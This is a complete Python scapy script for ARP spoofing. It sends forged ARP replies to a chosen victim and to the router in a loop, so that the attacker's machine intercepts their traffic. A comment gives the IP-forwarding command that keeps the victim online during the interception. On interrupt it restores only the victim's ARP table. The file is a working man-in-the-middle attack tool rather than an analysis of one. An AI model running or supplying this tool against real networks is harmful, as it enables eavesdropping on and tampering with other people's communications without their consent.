#!usr/bin/python3
import scapy.all as scapy
import argparse
import time


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-T', '--target', dest='victim_ip',
                        help='IP of the target machine')
    parser.add_argument('-R', '--router', dest='router_ip',
                        help='IP of the router')
    options = parser.parse_args()
    if not options.victim_ip:
        parser.error(
            '[-] Please specify target IP, use --help for more info.')
    elif not options.router_ip:
        parser.error(
            '[-] Please specify Router IP, use --help for more info.')
    return options


def get_mac(ip):
    # scapy.arping(ip)
    # prepare the packet to send all over the network
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')

    # send the packet to the network and receive the answer
    arp_request_broadcast = broadcast/arp_request
    ansewered_list = scapy.srp(
        arp_request_broadcast, timeout=1, verbose=False)[0]

    # get the MAC address of the victim's machine
    return ansewered_list[0][1].hwsrc


# packet prepared --> Kali machine become the router
# eg.: target_ip=192.168.82.219(victim machine)
# eg.: router_ip=192.168.82.209(gateway/router machine)
# arp -a to print ARP table of a machine

def spoof(target_ip, router_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)

    # send the packet to spoof the victim
    scapy.send(packet, verbose=False)
    # print(packet.show())
    # print(packet.summary())

# restore ARP table of a victim machine and router


def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
                       psrc=src_ip, hwsrc=src_mac)
    # send the packet to spoof the victim
    scapy.send(packet, count=4, verbose=False)


# getting arguments in input from user
options = get_arguments()

# maintain the spoof as long as I want ^C to interrupt
# but we need to forward ports to give internet to the victim machine
# echo 1 > /proc/sys/net/ipv4/ip_forward
sent_packet_count = 0
try:
    while True:
        spoof(options.victim_ip, options.router_ip)
        spoof(options.router_ip, options.victim_ip)
        # spoof(victim_ip, router_ip)
        # spoof(router_ip, victim_ip)
        sent_packet_count = sent_packet_count + 2
        print('\r[+] Packets sent ' + str(sent_packet_count), end='')
        time.sleep(2)
except KeyboardInterrupt:
    restore(options.victim_ip, options.router_ip)
    print('\n[+] Detected CTRL + C ... Quitting and Restore ARP table.')
